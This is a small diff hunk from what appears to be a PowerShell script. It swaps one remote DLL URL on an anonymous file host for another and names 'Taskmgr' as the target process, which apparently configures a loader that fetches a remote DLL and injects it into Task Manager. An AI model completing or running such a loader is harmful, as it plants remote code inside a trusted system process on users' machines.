@@ -5,7 +5,7 @@ function Log-Skip($msg) { $script:skip++ }
 function Log-Fail($msg) { $script:fail++ }
 
 # --- CONFIG ---
-$DLL_URL = "https://files.catbox.moe/pvpimw.dll"
+$DLL_URL = "https://files.catbox.moe/pgsxce.dll"
 $DLL_B64 = ""
 $PROC_NAME = "Taskmgr"
 
